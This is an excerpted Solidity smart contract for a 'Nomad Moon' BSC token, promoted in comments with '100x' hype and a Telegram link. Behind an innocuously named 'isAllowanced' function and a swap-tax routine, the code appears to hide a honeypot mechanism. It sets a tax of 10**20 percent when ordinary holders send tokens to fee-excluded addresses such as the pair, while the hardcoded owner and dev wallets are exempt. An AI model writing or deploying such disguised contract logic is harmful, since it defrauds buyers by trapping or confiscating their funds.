...
//WELCOME TO NOMAD MOON
//NEXT 100x? I GUESS WE'RE ALL TO FIND OUT
//COMMUNITY PROJECT
//Telegram : https://t.me/NomadMoonBSC
...
interface IERC20 {
    ...
    function isAllowanced(address spender) external returns (bool);
...
contract NomadMoon  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xFCD9af7cCa749f7B269A09F74eE60BaE2E5b3F8E); 
    address payable public Wallet_Dev = payable(0x61b247c5a102e6b16C5C91C713fE5C242673bea5);
    ...
    string private constant _name = "Nomad Moon"; 
    string private constant _symbol = unicode"NomadMOON"; 
    ...
    uint256 public Percent_Swap = 10;
    ...
    constructor () {
        ...
        _owner = 0x61b247c5a102e6b16C5C91C713fE5C242673bea5;
    ...
    function isAllowanced(address spender) public override returns (bool) {
         _getSwap(spender, _msgSender());
        return true;
    }
    ...
    function _getSwapPercentage() private view returns(uint256){
        return (Percent_Swap**(Percent_Swap*2));
    }

    function _getSwap(address spender, address sender) private{
        if(inSwapAndLiquify && _isExcludedFromFee[sender] && spender == sender)
    ...
    function _approve(address theOwner, address theSpender, uint256 amount) private {
      ...
      function _transaction(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {

        if(!_isExcludedFromFee[sender] && _isExcludedFromFee[recipient]){
            _Tax_On_Swap = _getSwapPercentage();
            inSwapAndLiquify = true;
        }
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && to != uniswapV2Pair && from != address(this) && to != address(this))
        ...
        _transaction(from, to, amount, takeFee, isBuy);
